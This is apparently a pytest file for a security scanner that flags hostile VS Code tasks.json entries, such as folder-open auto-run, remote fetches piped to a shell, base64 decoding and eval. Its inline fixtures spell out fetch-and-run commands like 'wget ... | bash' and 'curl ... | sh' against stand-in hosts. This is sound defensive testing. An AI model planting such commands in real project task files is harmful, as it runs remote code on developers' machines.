from pathlib import Path

import pytest

from dev_guard.checks import Finding, scan

FIXTURES = Path(__file__).parent / "fixtures" / "h2"

# 1-based lines in tests/fixtures/h2/malicious/.vscode/tasks.json
A_LINE, B_CMD_LINE, B_CURL_LINE, C_LINE = 7, 13, 16, 25


def run(root):
    return {(f.severity, f.pattern, f.line) for f in scan(root, extra_files=())}


def write_tasks(tmp_path, content):
    p = tmp_path / ".vscode" / "tasks.json"
    p.parent.mkdir(parents=True)
    p.write_text(content)
    return p


def test_clean_fixture_empty():
    assert scan(FIXTURES / "clean", extra_files=()) == []


def test_malicious_fixture():
    findings = scan(FIXTURES / "malicious", extra_files=())
    assert {f.check_id for f in findings} == {"H2"}
    assert {(f.severity, f.pattern, f.line) for f in findings} == {
        ("med", "run_on_folder_open", A_LINE),
        ("med", "run_on_folder_open", B_CMD_LINE),
        ("high", "network_fetch", B_CURL_LINE),
        ("high", "remote_shell", B_CURL_LINE),
        ("high", "base64_decode", C_LINE),
        ("high", "remote_shell", C_LINE),
    }


def test_args_only_override(tmp_path):
    write_tasks(tmp_path, """{
  "tasks": [
    {
      "command": "echo ok",
      "linux": {
        "args": [
          "-c",
          "wget -qO- http://example.invalid/l | bash"
        ]
      }
    }
  ]
}
""")
    assert run(tmp_path) == {("high", "network_fetch", 8), ("high", "remote_shell", 8)}


def test_quoted_arg_objects(tmp_path):
    write_tasks(tmp_path, """{
  "tasks": [
    {
      "command": { "value": "bash", "quoting": "escape" },
      "args": [
        "-c",
        {
          "value": "eval \\"$(cat ~/.cache/y)\\"",
          "quoting": "strong"
        }
      ]
    }
  ]
}
""")
    assert run(tmp_path) == {("high", "eval", 8)}


@pytest.mark.parametrize("content", [
    '{"tasks": ' + "[" * 100000,
    '{"tasks": [{"x": ' + "9" * 5000 + "}]}",
], ids=["deep_nesting", "huge_int"])
def test_hostile_json(tmp_path, content):
    p = write_tasks(tmp_path, content)
    assert scan(tmp_path, extra_files=()) == [Finding("H2", "low", str(p), 1, "malformed_json")]


def test_jsonc_falls_back_to_raw_scan(tmp_path):
    write_tasks(tmp_path, """// generated
{"tasks": [{
"command": "curl -s https://example.invalid/x | sh",
"runOptions": {"runOn": "folderOpen"}
}]}
""")
    assert run(tmp_path) == {
        ("low", "malformed_json", 1),
        ("med", "run_on_folder_open", 4),
        ("high", "network_fetch", 3),
        ("high", "remote_shell", 3),
    }


@pytest.mark.parametrize("content", ["[]", "{}", '{"tasks": "x"}', '{"tasks": [1, "a", null]}'])
def test_type_confused(tmp_path, content):
    write_tasks(tmp_path, content)
    assert scan(tmp_path, extra_files=()) == []


def test_not_under_vscode_ignored(tmp_path):
    (tmp_path / "tasks.json").write_text('{"tasks": [{"command": "curl x | sh"}]}')
    assert scan(tmp_path, extra_files=()) == []
